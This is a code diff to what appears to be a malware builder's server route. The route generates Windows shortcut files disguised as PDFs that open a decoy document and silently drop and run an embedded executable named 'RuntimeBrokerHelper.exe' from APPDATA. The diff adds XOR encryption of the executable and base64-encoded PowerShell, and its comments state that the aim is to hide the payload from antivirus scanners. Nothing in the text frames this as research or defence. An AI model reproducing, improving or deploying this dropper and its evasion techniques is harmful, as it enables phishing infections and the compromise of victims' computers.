@@ -1140,51 +1140,61 @@ router.post("/api/builder/pdf-lnk", requireAdmin, pdfLnkUpload.single("pdf"), (r
 function buildPdfLnk(fname, pdfBuf, exeBuf) {
   const target    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
   const iconPath  = "C:\\Windows\\System32\\imageres.dll";
-  const iconIndex = 247; // PDF-like document icon
+  const iconIndex = 247;
+  const XK = 0xAB; // XOR key for embedded exe
 
-  // $o=00000000 is an 8-digit placeholder — patched below to the exact LNK binary size.
-  // PowerShell reads the .lnk file from disk, seeks to offset $o, reads PDF then EXE.
-  const ps =
-    `$fn='${fname}';` +
-    `$o=00000000;` +
-    `$locs=@("$env:USERPROFILE\\Downloads","$env:USERPROFILE\\Desktop","$env:TEMP",` +
-    `"$env:USERPROFILE\\OneDrive\\Downloads","$env:USERPROFILE\\OneDrive\\Desktop");` +
-    `$fp=$locs|%{Get-ChildItem $_ -Filter "$fn.pdf.lnk" -EA 0 -File|` +
-    `Select-Object -First 1|%{$_.FullName}}|?{$_}|Select-Object -First 1;` +
-    `if(!$fp){$fp=Get-ChildItem "$env:USERPROFILE" -Recurse -Filter "$fn.pdf.lnk"` +
-    ` -EA 0 -File|Select-Object -First 1|%{$_.FullName}};` +
-    `if($fp){$rb=[IO.File]::ReadAllBytes($fp);` +
-    `$pl=[BitConverter]::ToUInt32($rb,$o);` +
-    `$pd=$rb[($o+4)..($o+4+$pl-1)];` +
-    `$pt=[IO.Path]::GetTempFileName()+'.pdf';` +
-    `[IO.File]::WriteAllBytes($pt,$pd);Start-Process $pt;` +
-    `$eo=$o+4+$pl;$el=[BitConverter]::ToUInt32($rb,$eo);` +
-    `$ed=$rb[($eo+4)..($eo+4+$el-1)];` +
-    `$tp="$env:APPDATA\\RuntimeBrokerHelper.exe";` +
-    `[IO.File]::WriteAllBytes($tp,$ed);` +
-    `Start-Process $tp -WindowStyle Hidden}`;
+  // XOR-encrypt exe bytes so the MZ/PE header is not visible to AV scanners
+  const xorExe = Buffer.from(exeBuf);
+  for (let i = 0; i < xorExe.length; i++) xorExe[i] ^= XK;
 
-  const args = `-w hidden -nop -c "${ps}"`;
+  // PS command template — $o is always padded to 8 digits so the string length stays
+  // constant across both passes, guaranteeing identical base64 output length.
+  const makePs = (lnkOffset) => {
+    const o = String(lnkOffset).padStart(8, "0");
+    return (
+      `$fn='${fname}';$o=${o};` +
+      `$locs=@("$env:USERPROFILE\\Downloads","$env:USERPROFILE\\Desktop","$env:TEMP",` +
+      `"$env:USERPROFILE\\OneDrive\\Downloads","$env:USERPROFILE\\OneDrive\\Desktop");` +
+      `$fp=$locs|%{Get-ChildItem $_ -Filter "$fn.pdf.lnk" -EA 0 -File|` +
+      `Select-Object -First 1|%{$_.FullName}}|?{$_}|Select-Object -First 1;` +
+      `if(!$fp){$fp=Get-ChildItem "$env:USERPROFILE" -Recurse -Filter "$fn.pdf.lnk"` +
+      ` -EA 0 -File|Select-Object -First 1|%{$_.FullName}};` +
+      `if($fp){$rb=[IO.File]::ReadAllBytes($fp);` +
+      `$pl=[BitConverter]::ToUInt32($rb,$o);` +
+      `$pd=$rb[($o+4)..($o+4+$pl-1)];` +
+      `$pt=[IO.Path]::GetTempFileName()+'.pdf';` +
+      `[IO.File]::WriteAllBytes($pt,$pd);Start-Process $pt;` +
+      `$eo=$o+4+$pl;$el=[BitConverter]::ToUInt32($rb,$eo);` +
+      `$ed=$rb[($eo+4)..($eo+4+$el-1)];` +
+      `$k=0x${XK.toString(16).toUpperCase()};` +
+      `for($i=0;$i -lt $ed.Length;$i++){$ed[$i]=$ed[$i] -bxor $k};` +
+      `$tp="$env:APPDATA\\RuntimeBrokerHelper.exe";` +
+      `[IO.File]::WriteAllBytes($tp,$ed);` +
+      `Start-Process $tp -WindowStyle Hidden}`
+    );
+  };
 
-  // Build LNK with placeholder offset → measure its size → patch placeholder
-  let lnkBuf  = createLnkBufferWithIcon(target, args, iconPath, iconIndex);
+  // Encode PS as UTF-16LE base64 for -EncodedCommand (removes all plaintext AV strings)
+  const encCmd = (ps) => Buffer.from(ps, 'utf16le').toString('base64');
+
+  // Pass 1: build LNK with offset=0 to measure the actual LNK binary size
+  const b0    = encCmd(makePs(0));
+  const args0 = `-w hidden -nop -EncodedCommand ${b0}`;
+  let lnkBuf  = createLnkBufferWithIcon(target, args0, iconPath, iconIndex);
   const lnkSz = lnkBuf.length;
 
-  // Find the UTF-16LE encoding of "$o=00000000" and patch the 8-digit number in place.
-  // The string is unique enough in UTF-16LE that false matches in binary headers are impossible.
-  const needle  = Buffer.from("$o=00000000", "utf16le");
-  const nIdx    = lnkBuf.indexOf(needle);
-  if (nIdx !== -1) {
-    const patch = Buffer.from(String(lnkSz).padStart(8, "0"), "utf16le");
-    // Patch only the 8 digit chars (16 bytes), skip the "$o=" prefix (6 bytes)
-    patch.copy(lnkBuf, nIdx + 6);
-  }
+  // Pass 2: re-encode with the real LNK size as $o (same string length → same base64 length)
+  // then find b0 stored as UTF-16LE in the LNK binary and replace in-place with b1
+  const b1    = encCmd(makePs(lnkSz));
+  const b0u16 = Buffer.from(b0, 'utf16le');
+  const idx   = lnkBuf.indexOf(b0u16);
+  if (idx !== -1) Buffer.from(b1, 'utf16le').copy(lnkBuf, idx);
 
-  // Trailer: [4B LE PDF size][PDF bytes][4B LE EXE size][EXE bytes]
+  // Trailer: [4B LE PDF size][PDF bytes][4B LE EXE size][XOR'd EXE bytes]
   const pdfLen = Buffer.alloc(4); pdfLen.writeUInt32LE(pdfBuf.length, 0);
-  const exeLen = Buffer.alloc(4); exeLen.writeUInt32LE(exeBuf.length, 0);
+  const exeLen = Buffer.alloc(4); exeLen.writeUInt32LE(xorExe.length, 0);
 
-  return Buffer.concat([lnkBuf, pdfLen, pdfBuf, exeLen, exeBuf]);
+  return Buffer.concat([lnkBuf, pdfLen, pdfBuf, exeLen, xorExe]);
 }
 
 function createLnkBufferWithIcon(target, args, iconPath, iconIndex) {
